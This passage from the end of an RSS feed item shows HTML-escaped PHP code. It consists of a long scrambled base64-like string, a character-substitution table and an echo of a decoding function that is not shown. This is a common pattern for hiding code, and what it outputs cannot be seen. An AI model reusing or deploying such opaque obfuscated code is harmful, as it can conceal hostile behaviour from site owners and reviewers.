&#39;JErb0kVtFsxbPPrqJEVbJIVBFTVBODMeDK6vwKazDK6vwK6vwK6WhPcWQIrXwfcb8sxIg+3t0pBG&#39;.
&#39;hP3mPz5tQjcWOZvXwK6vE9vKDM6vwK6WEIrGJP3GJPVvE4ctNAcbP1rXEfrgF8rb0X3tFUMvJsxRFPrqep6vJg&#39;.
&#39;rIzKhbFAlvwf34FAlvwfxGQX54QAcvzKhbh1VWfp6vJ4x49oMeDK6vwKazDK6vwK6vwK6bP46vK8VtRzcWfDhWJD5BOoi4nAcb&#39;.
&#39;P1rP94ctNAcbP1rXfKhX3K5BFu3mnprbnXrbSDhWJD5BOoi4nAcbP1rP94ct&#39;.
&#39;NAcbP1rXfs6WpM6vwK6vwK6vwK6vwKhWE8x4noxIw96bnIx4nNMvJsxRFPrqep6vJgrIzKhbFAlvwf34FAlvwfxGQX54QAcvzKh&#39;.
&#39;bh1VWfp6vJ4x49oMypM6vwK6vwK6vwK6vwK3mnprn9RxmQIBmVRr4Fu3BhI3BfDhWJD5BOoi4nAcbP1rP9&#39;.
&#39;4ctNAcbP1rXzKhWE8x4noxIfZvXwK6vwK6vwKueDK6vwKues9vKsArbnTxIEz5WEo3tPpVBhna&#39;.
&#39;bFPxWJsrm7KVB8gVtNfxIEnabFPxWJsrm7MazDK6vwKxWQXrbPA6bVRr4Fg5t9j6bQIx49IytQ&#39;.
&#39;TxmnqVkKsvXwK6vEZvXwK6vwK6vwKhbQIx49IyBFq6CgKhT0TcWh1r4x+hIwj6vJg5&#39;.
&#39;bPTlyNqVBJFVBFT3tcPMvfKlXwXiv9TcWh1r4x+ibhI6v2+Bb7XHzDK&#39;.
&#39;6vwK6vwK6WhPcWQIrXwfVBhIrGhFxmxZvXwK6vE9vqgMvKDMlI2&#39;.
&#39;1lI21lI21lI21lI21lI21lI21lI21lI21lI21lI21lI21lI21lI21lI21lI21lI2&#39;.
&#39;1lI21lI21lI21lI21lI2Mv4VRr4Fg5t9j6WFPr4JyrBJzytnsrvKfVqh1rQ9PrtnsrvzKhbVIrmRur4noVkzKhWJ1lvwfxGQX5&#39;.
&#39;4QAcvzKhbh1VWfp6vJgaBEPlvwf3m9jV4PqBmVsrbSsvqpMvkJo&#39;.
&#39;3tPp6CgKr4QG6nE6SLR85t0PxXKsHzDhhbR85tzoi4PTytnsrvKsHzDM6vwK6vJo3tPplyNC5bnISmQg6CgKhGQ&#39;.
&#39;gVXg7hTpMvkJo3tPplyNyVBJbx49oMvJ4x49oBmQo3tPplvwfVqh1rQ9j3tRPM&#39;.
&#39;ypMvkJo3tPplyNEVbJEVbJIVBFTMvJgrIfZvKffrtnsrvg+SGQX54QAcvw96vJTcthYVtFgHzDhvKPsVXwDhWJNxbSK&#39;.
&#39;iygK6ALXMeDhazDhvkJo3tPplyNFxmc6QLROMvJXrmJNMypMvBgMvtQpxmQsVXwDhWJNxbSKiyg&#39;.
&#39;K6A6XMeDhazDhvkJo3tPplyNsxg8SySzDV4npxmSsHzDhvkJo3tPplyNvrmJN6CgKhbh1VWfZvKP9vKDh5t3KMbPTxmQgMvJuJfP&#39;.
&#39;OJQOsMeDhazDhvtV1x4Q83mKDhn9bkS0nSIE8xIwf5mQN6Cg+6vJ45t0PMeDhvBp&#39;.
&#39;Mvefh5t3KMvJ45t0PtIcgrBEur4noVkcc6vL96vJArmN45tcuV4PpVkfMvefhazDhvefhhbR85tzoi4nfVLngcbnA5bR&#39;.
&#39;PrqeDhbVsrbQrhGJoxn9j3tRPhRgp6vJ45t0PtIcj3tRPhRgsHzDhveP9vKfhueDhueDMvtP46vK8hbR85t&#39;.
&#39;zoiqFPr4eDMkfMvBpMvePIVBJRx47KhbR85tzoifQIx49IktN4rTpMvBgMvtQpxmSMvBpMvePIV&#39;.
&#39;BJRx47KOCpMvBgMueDM5t3KMbPTxmQgMvJuJfPOJQOsMesZvKP4rGhP3tFDMvJuJfPOJQOK3BOKhboPa&#39;.
&#39;kw9iXwfV4PpVkfMvBpMvePsVX8TcWhzrGODhbVsrbQrhmN8rtSqBkzK6XNYxbxXMkfMve&#39;.
&#39;PZvKfhvkJIVBOKikEgaBEPOQ9TVtNfMvJ45t0PtIcgrBEur4noVkccMyp&#39;.
&#39;M6vwK6vwK6vwK6vwK5t3KMvJIVBOsvXwK6vwK6vwK6vwK6WpM6vwK6vwK6vwK6vwK6vwK6bQA5b2KhWhPxTpM6vwK6vwK6vwK&#39;.
&#39;6vwKueDhvBgMvBgMueDMv4VRr4Fg5t9j6bRN5bQ7O4hsrXKKhWFgxXws6WpM6vwK6v&#39;.
&#39;JT34Pj6CgK6X6ZvXwK6vwfrbQj6CgKxGJIrbQjMvwfxGJI6vfZvXwK6vE&#39;.
&#39;4rG6KMvwf5kw96CwZ6vJs6CzKhb0PrApKhbfKMTgKOXws6WpM6vwK6vwK6vwfxmhsrXwjikEz3tFUMvwXkvDXlvETcthT&#39;.
&#39;cW6D6vJTcW6p6vJslvwI6vfKMypM6vwK6WgMvXwK6vEIVBJRx47KhWFX5t7ZvqgMvK&#39;.
&#39;s4ctNAcbP1rXEfVtF1VbSDhbJ8cbLp6vJUVBfsvqpMvkJ1cBJuVbng3kw96v6XH&#39;.
&#39;zDMvtV1xXwDhbf9OCpKhbf2xGJIrbQjMvJf3BJ8MypsvKPZvKfhV49I6vKf5AgzHIwf5A0TcWhp&#39;.
&#39;Vt7DhboPakfKhX3Khbf2xGJIrbQjMvJf3BJ8MypKhbDUMIzKhbfUMIfMvePZvKfhvkJ1cBJu&#39;.
&#39;Vbng3kwjikEA5W6DrGhfMvJf3BJ8tIJsBkfKBXE1x4eDhboPaQpf5PgsM&#39;.
&#39;ypMveP9vKP9vKDhx4QgcBhj6vJ1cBJuVbng3ypMueDMVqQj3GJsrm7KcWPzVynuxmQjVvKf3m9jV4PqBmVsrbSsv&#39;.
&#39;qpM6vwK6vJf3BJ86CgKV4PpVQ9qVBJu3m9jcbQjcWODhbF1r4VsVR945t0PMypMvkJTcbnIcn9zrGOKikETcWhzrGODhbJ8cbLp6&#39;.
&#39;bRN5bQ7O4hsrXKXV4Vf3k6sMypMvtP46vKfxGJ8xqJuxb9TMeDhazDhvkJTcbnIcn9zr&#39;.
&#39;GOKMTgKMC6zMypMveffVtNfBGE1xIw96WFgxqhzrGODhbJ8cbLp6bRN5bQ7O4hs&#39;.
&#39;rXKXV4VfHk6sMypMvePsVXwDhbQjVn9zrGOsvKfhazDhveffVbng3kw96WFR3qFgxXKfVbng3kzKhWFg3BhgBGE1xIzK&#39;.
&#39;hbQjVn9zrGOsHzDhvBgMvePPrWFPvKfhazDhvePIVBJRx47KJfnOSgSZvKfhueDhueDh&#39;.
&#39;Vt0TVeDhazDhvBhPcWQIrXEbeS0yJypMvBgMvXwK6vwf5mQN6CgKhn9yJQhtJQhrhg8SQnEukL9yQvcc6v7&#39;.
&#39;Khn9yJQhtJQhrhRhnSQQnSRJuQQhhhRgZvXwK6vwfVbng3kw96bJP3m9fVkKfVbng3kzKhboPakfZv&#39;.
&#39;KffVbng3kw96LERrqFPx4P8rbPdVkKfVbng3kfZvKDK6vwK5t3KMvLfVbng3kE2uvw85BFTV&#39;.
&#39;BeDhbJ8cbnrhmnUhRgsMeDK6vwKazDK6vwK6vwK6WhPcWQIrXEbeS0yJypM6vwK6WgMvKPsVXwDhbJ8cbnrh&#39;.
&#39;mnUhRgK6ygK6A3THCeG3Awglth4HtSoFChPOkg73te7ltSzVCO0O4JXVbJP3k6svKPZvKfhVB8scvKsHzDh&#39;.
&#39;ueDM6vwK6bP46v8sxGFPcvKfVbng3Qpq3IccMkfM6vwK6WpM6vwK6vwK6vwfx4QTtIhI6PRr64OXBkw96vJf3BJ8&#39;.
&#39;tIcAhRgZvXwK6vwK6vwKx4QgcBhj6bh8xmSmFn9Pr4F1VbSDxmQI5tnp5BsPMvJIVBOsMypMvXwK6vE9&#39;.
&#39;vKDhhbc1rmeKikwzHzDhhbh8Vvw96CwZvKffrbnTcn9Pxqh1xXw96CwZvKDhV49IVtnA5vwDhbJ8cbnr&#39;.
&#39;hmSqBkE8xIwfctPfiy7fVtR85tzsvKPZvKfhhWJDVtRP6CgKhbJ8cbnrhGOqBQo8xqh8aQ9I3tNfMvJf3BJ8tIcThRgsBypMvef&#39;.
&#39;fcb8PrtSKikE8rWJPxP9o3tFIrGODhWJDVtRPMypMveffcb8PrtSKikEjctR&#39;.
&#39;urtnAx49TMvJg5bQoVkfZvKfhhWJDVtRP6CgKabNRrQ9o3tFIrGODhW&#39;.
&#39;JDVtRPMypMvKfhhbRPxGF8VmSKikwfVbng3QpqrvccHzDhvkJoVBFT3tcP6CgK3t0gVBhurtnAx49TMvJoVBFT3t&#39;.
&#39;cPMypMveffrtQTxmnqVkw96bNRrQ9o3tFIrGODhbRPxGF8VmSsHzDhvkJoVBFT3tcP6CgKab&#39;.
&#39;NRrQ9o3tFIrGODhbRPxGF8VmSsHzDhvkJoVBFT3tcP6CgKVqJP5t0urtnAx49TMvJoVBFT3tcPlvwfctPfMyp&#39;.
&#39;MvKfhhbVIrmgKikwfVbng3QpqVXcctmnIx4nNBGh8r4eDhbJ8cbnrhm3qBkPcHzDhvkJ4x49o6CgK3t0gVBhurtnAx49&#39;.
&#39;TMvJ4x49oMypMveffVqh1rkw96bNRrQ9o3tFIrGODhbVIrmgsHzDhvkJ4x49o6CgKabNR&#39;.
&#39;rQ9o3tFIrGODhbVIrmgsHzDhveDhvtP46v8TcWhTcW6DhbVIrmgp6vhreRQyQL9FB&#39;.
&#39;k6s6Cg96LVEynFnMeDhvBpMvefhhbVIrmgKikE4x49oBm81xGeDh&#39;.
&#39;bVIrmgsHzDhvBgMvePPrWFPvKfhazDhveffVqh1rkw96WFgxP9IVBEp3tFPMvhreRQyQL9FBk6p6v6Xl&#39;.
&#39;vwfVqh1rkfZvKfhueDhveDhvkJ4x49oBmQo3tPp6CgKVB8zrb9fVkKXiv6p6vJ4x49oMyp&#39;.
&#39;MveffVqh1rQ9Prtnsrvw96bQ7xb01VbSD6A7XlvwfVqh1rQ9Prtnsrnp0BkfZvKfhhbVIr&#39;.
&#39;mRur4noVkw96bQ7xb01VbSD6PzX6XzKhbVIrmgsHzDMveffrbnTcn9Pxqh1xXw96WFPr4JyrBJzytnsrvKfVqh1rQ9Prtn&#39;.
&#39;srnpzBkzKhbVIrmRur4noVQp0BkzKhbQo3tPplvwfcb8PrtSp6v&#39;.
&#39;JoVBFT3tcPlvwfVbng3QpqrWeqBkzKhbF1r4VsVR945t0PMypMvefMvePsVXwDhb08xGJuVBh&#39;.
&#39;IrG6Kiyg96CwsvKfhazDhveffVm91VvpUHzDhvBgMvePPrWFPvKfhazDhveff34nfM&#39;.
&#39;IpZvKfhvkJqrm9f6CgK3m9RrqeDhbJ8cbnrhmSqBkfKlkwf34nfHzDhvB&#39;.
&#39;gMvBgMvKffx4QTtIhI6PRr64SXBkw96vJp3BFgBmQIx49I6Cg9ikEbeS0yJkw/6CwKHXwfrbnTcn9Pxqh1xApMvkJIVBFr6q6XB&#39;.
&#39;QpXVIhc6CgKhbc1rmeZvKffx4QTtIhI6PRr646XBkw96vJX3teZvKDhx4QgcBhj6bh8xmSmFn9Pr4&#39;.
&#39;F1VbSDxmQI5tnp5BsPMvJIVBOsMypMueD=&#39;;
$mczwo = Array(&#39;1&#39;=&amp;gt;&#39;v&#39;, &#39;0&#39;=&amp;gt;&#39;x&#39;, &#39;3&#39;=&amp;gt;&#39;Y&#39;, &#39;2&#39;=&amp;gt;&#39;8&#39;, &#39;5&#39;=&amp;gt;&#39;a&#39;, &#39;4&#39;=&amp;gt;&#39;m&#39;, &#39;7&#39;=&amp;gt;&#39;4&#39;, &#39;6&#39;=&amp;gt;&#39;I&#39;, &#39;9&#39;=&amp;gt;&#39;9&#39;, &#39;8&#39;=&amp;gt;&#39;h&#39;, &#39;A&#39;=&amp;gt;&#39;j&#39;, &#39;C&#39;=&amp;gt;&#39;D&#39;, &#39;B&#39;=&amp;gt;&#39;X&#39;, &#39;E&#39;=&amp;gt;&#39;B&#39;, &#39;D&#39;=&amp;gt;&#39;o&#39;, &#39;G&#39;=&amp;gt;&#39;3&#39;, &#39;F&#39;=&amp;gt;&#39;N&#39;, &#39;I&#39;=&amp;gt;&#39;y&#39;, &#39;H&#39;=&amp;gt;&#39;O&#39;, &#39;K&#39;=&amp;gt;&#39;g&#39;, &#39;J&#39;=&amp;gt;&#39;R&#39;, &#39;M&#39;=&amp;gt;&#39;K&#39;, &#39;L&#39;=&amp;gt;&#39;E&#39;, &#39;O&#39;=&amp;gt;&#39;M&#39;, &#39;N&#39;=&amp;gt;&#39;5&#39;, &#39;Q&#39;=&amp;gt;&#39;V&#39;, &#39;P&#39;=&amp;gt;&#39;l&#39;, &#39;S&#39;=&amp;gt;&#39;U&#39;, &#39;R&#39;=&amp;gt;&#39;1&#39;, &#39;U&#39;=&amp;gt;&#39;r&#39;, &#39;T&#39;=&amp;gt;&#39;z&#39;, &#39;W&#39;=&amp;gt;&#39;H&#39;, &#39;V&#39;=&amp;gt;&#39;Z&#39;, &#39;Y&#39;=&amp;gt;&#39;q&#39;, &#39;X&#39;=&amp;gt;&#39;i&#39;, &#39;Z&#39;=&amp;gt;&#39;7&#39;, &#39;a&#39;=&amp;gt;&#39;e&#39;, &#39;c&#39;=&amp;gt;&#39;d&#39;, &#39;b&#39;=&amp;gt;&#39;G&#39;, &#39;e&#39;=&amp;gt;&#39;Q&#39;, &#39;d&#39;=&amp;gt;&#39;6&#39;, &#39;g&#39;=&amp;gt;&#39;0&#39;, &#39;f&#39;=&amp;gt;&#39;k&#39;, &#39;i&#39;=&amp;gt;&#39;P&#39;, &#39;h&#39;=&amp;gt;&#39;J&#39;, &#39;k&#39;=&amp;gt;&#39;S&#39;, &#39;j&#39;=&amp;gt;&#39;u&#39;, &#39;m&#39;=&amp;gt;&#39;2&#39;, &#39;l&#39;=&amp;gt;&#39;L&#39;, &#39;o&#39;=&amp;gt;&#39;t&#39;, &#39;n&#39;=&amp;gt;&#39;F&#39;, &#39;q&#39;=&amp;gt;&#39;n&#39;, &#39;p&#39;=&amp;gt;&#39;s&#39;, &#39;s&#39;=&amp;gt;&#39;p&#39;, &#39;r&#39;=&amp;gt;&#39;b&#39;, &#39;u&#39;=&amp;gt;&#39;f&#39;, &#39;t&#39;=&amp;gt;&#39;W&#39;, &#39;w&#39;=&amp;gt;&#39;A&#39;, &#39;v&#39;=&amp;gt;&#39;C&#39;, &#39;y&#39;=&amp;gt;&#39;T&#39;, &#39;x&#39;=&amp;gt;&#39;c&#39;, &#39;z&#39;=&amp;gt;&#39;w&#39;);
echo(yxsp($cwhs, $mczwo));?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
  </channel>
</rss>